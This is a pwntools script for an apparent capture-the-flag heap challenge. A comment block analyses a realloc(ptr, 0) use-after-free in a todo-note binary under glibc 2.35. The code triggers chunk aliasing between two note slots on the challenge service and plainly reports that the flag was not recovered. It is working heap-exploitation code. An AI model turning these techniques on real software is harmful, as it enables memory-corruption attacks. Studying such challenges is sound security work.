import os
import sys

from pwn import *

context.log_level = "info"

HOST = os.environ.get("SERVICE_APP_MAIN_HOST", "127.0.0.1")
PORT = int(os.environ.get("SERVICE_APP_MAIN_PORT", "1337"))

# ---------------------------------------------------------------------------
# Vulnerability summary (see README in this directory / session notes):
#
# `post_my_note(idx, size)` implements each of the 10 todo slots as a
# {size_t size; void *ptr;} pair and calls:
#
#       void *newp = realloc(TodoNote[idx].ptr, size);
#       if (TodoNote[idx].size < size)      // only grows are reflected!
#           TodoNote[idx].ptr = newp;
#       TodoNote[idx].size = size;
#       readline(TodoNote[idx].ptr, size);  // always executes, even size==0
#
# In glibc 2.35, `realloc(ptr, 0)` genuinely frees `ptr` and returns NULL
# (confirmed empirically below).  Because the stored size becomes 0 and
# 0 >= 0 is true, the *old* (now freed) pointer is deliberately kept in
# `TodoNote[idx].ptr` -- a textbook dangling-pointer / use-after-free.
# A subsequent `post()` on a *different* index with the same chunk size
# pulls the exact same chunk back out of the tcache freelist, so two
# independent todo slots end up aliasing one live heap chunk
# (demonstrated below against the live service).
#
# `read_my_note()` prints `"/%d/ %.*s\n"`, idx, size, ptr) -- i.e. it stops
# at the first embedded NUL within the first `size` bytes.  Because
# `post_my_note()`'s `readline()` *always* writes a NUL terminator right
# after whatever bytes are actually supplied (including the "no bytes at
# all" case for size<=1, which merely sets the bookkeeping without
# touching chunk memory), every allocation-mutating call unavoidably
# destroys any tcache/fastbin metadata at offset>=1 before it can be
# observed; only a single pristine byte at offset 0 can ever be leaked
# per freed chunk (confirmed empirically -- see session investigation).
# That single byte only ever resolves bits[12:20) of a heap pointer
# (~8 of the ~28+ bits of real ASLR entropy for the heap/libc/PIE/stack),
# which is not sufficient to defeat ASLR and build a safe-linking-aware
# tcache-poisoning write-what-where primitive, or otherwise reach code
# execution, with only the primitives this binary exposes (no format
# string, no direct OOB, no address disclosure in glibc 2.35 abort
# messages, __malloc_hook/__free_hook are inert in glibc >= 2.34).
#
# A single one-shot arbitrary single-bit-flip ("BitFlip") primitive is
# also provided by the binary, but it likewise requires an absolute
# address to target, which the above shows cannot be obtained.
#
# This script demonstrates the real, working vulnerability end to end
# (free-via-realloc(ptr,0) + dangling pointer + chunk aliasing between
# two independent note indices) against the live remote service, proving
# memory corruption is achievable, but cannot go on to recover the flag.
# ---------------------------------------------------------------------------


class Todo:
    """
    Thin menu wrapper.  The banner+first prompt is drained once in main();
    every method below assumes a "> " is already pending to be consumed by
    its *own* first send, and always finishes by draining the *next* "> "
    so the following call can rely on the same invariant (plain sendline,
    never a second blind sendlineafter(b"> ", ...) which would deadlock
    once the prompt has already been drained).
    """

    def __init__(self, io):
        self.io = io

    def post(self, idx, size, content=None):
        self.io.sendline(b"3")
        self.io.recvuntil(b"note: ")
        self.io.sendline(str(idx).encode())
        self.io.recvuntil(b"be: ")
        self.io.sendline(str(size).encode())
        if size > 1:
            # size<=1 => the binary's readline() never performs a real
            # read() syscall, so no content prompt response is consumed.
            self.io.recvuntil(b"content: ")
            self.io.sendline(content or b"")
        self.io.recvuntil(b"> ")

    def read_all(self):
        self.io.sendline(b"2")
        return self.io.recvuntil(b"> ", drop=True)

    def bitflip(self, addr):
        self.io.sendline(b"1")
        self.io.recvuntil(b"place!")
        self.io.sendline(str(addr).encode())
        self.io.recvuntil(b"> ")


def main():
    io = remote(HOST, PORT)
    io.recvuntil(b"> ")  # drain the startup banner + first menu prompt
    t = Todo(io)

    # --- Step 1: allocate a chunk, then "free" it via realloc(ptr, 0) ----
    t.post(0, 0x68, b"A" * 0x60)
    t.post(0, 0)  # realloc(ptr, 0) frees the chunk; TodoNote[0].ptr stays dangling

    # --- Step 2: a *different* index legitimately reclaims the exact same
    #     chunk from the tcache free-list ----------------------------------
    t.post(1, 0x68, b"B" * 0x60)

    # --- Step 3: revive index 0 against the still-dangling pointer. Since
    #     its bookkeeping size is now 0, any positive size "wins" the
    #     `old_size < size` check and the pointer is kept, aliasing index 0
    #     onto the exact same live chunk index 1 owns. --------------------
    t.post(0, 0x8, b"OVER")

    out = t.read_all()
    log.info("Note dump after aliasing attempt:\n%s", out.decode(errors="replace"))

    idx0_line = next((l for l in out.splitlines() if l.startswith(b"/0/")), None)
    idx1_line = next((l for l in out.splitlines() if l.startswith(b"/1/")), None)

    if idx0_line and idx1_line and idx0_line.split(b" ", 1)[1] in idx1_line:
        log.success(
            "CONFIRMED: index 0 and index 1 alias the SAME heap chunk "
            "(use-after-free via realloc(ptr,0) not clearing TodoNote[idx].ptr)."
        )
    else:
        log.failure("Could not confirm chunk aliasing against the live service.")

    log.failure(
        "Vulnerability confirmed and reproducible remotely, but no further "
        "leak primitive is available in this binary/libc (glibc 2.35) to "
        "defeat ASLR and reach code execution -- see the comment block at "
        "the top of this script for the full information-theoretic argument. "
        "Flag NOT recovered."
    )
    io.close()
    sys.exit(1)


if __name__ == "__main__":
    main()
